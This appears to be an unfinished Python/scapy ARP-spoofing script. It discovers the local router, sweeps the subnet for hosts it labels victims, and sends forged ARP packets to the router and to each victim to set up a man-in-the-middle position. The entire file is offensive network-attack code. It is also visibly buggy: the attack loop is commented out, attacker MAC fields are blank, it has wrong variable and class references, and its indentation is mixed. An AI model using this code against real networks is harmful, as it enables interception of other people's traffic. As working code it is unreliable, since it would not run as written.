from scapy.all import *
import time

class Victim():
	def __init__(self, IPaddress):
		self.IP = IPaddress
		self.MAC = ""

# IP forwarding must be enabled.
class PrePreAttack(object):	
	def get_IP_Addrs(self, routerIP):
        	num_Array = routerIP.split('.')
        	arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
		ans, unans = arping(arp_List)
        	n = len(ans)
		victims = []
		for i in range(0, n):
			victims.append(Victim(ans[i][1].psrc))
		return victims

#class PreAttack(object):
#	def __init__(self, target, interface):
#		self.target = target
#		self.interface = interface
#	def get_MAC_Addr(self):
#		return srp(Ether(dst="ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc

class Attack(object):
	def __init__(self, router, targets, interface):
		self.router = router
		self.targets = targets 
		self.interface = interface
	def send_Poison(self):
		for i in range(0, len(targets)):
			#arp to spoof the victim, send to router
			arp1 = Ether() / ARP()
#			arp1[Ether].src = #attacking MAC address
#			arp1[ARP].hwsrc = #attacking MAC address
			arp1[ARP].psrc = self.targets[i].IP #IP to Spoof
			arp1[ARP].hwdst = self.targets[0].MAC
			arp1[ARP].pdst = self.router
			sendp(arp1, iface = self.interface)
			#arp to spoof the router, send to victim
			arp2 = Ether() / ARP()
#			arp2[Ether].src = #attacking MAC address
#			arp2[ARP].hwsrc = #attacking MAC address
			arp2[ARP].psrc = self.router #IP to Spoof
			arp2[ARP].hwdst = self.targets[i].MAC
			arp2[ARP].pdst = self.targets[i].IP
			sendp(arp2, iface = self.interface)


if __name__ == '__main__':
	import time
	from scapy.all import *
#	interface = #interface
#	my_macs = get_if_hwaddr(interface)
	IP_router = sr1(IP(dst = "www.wikipedia.org", ttl = 0)/ICMP()) #ttl = 0 to find the router with whom we connected
	print(IP_router.src)
	targets = PrePreAttack().get_IP_Addrs(IP_router.src)
	print(targets[0])
#	try:
#		for i in range(0, len(targets)):
#			targets[i].MAC=PreAttack(targets_P[i], interface).get_MAC_Addr()
#	except Exception:
#		print '[Cannot find MAC addresses]'
#	
#	while True:
#		try:
#			Attacks(IP_router.src, targets, interface).send_Poison()
#			sleep(3)
#		except Exception:
#			print '[Failed to send arp Poison]'
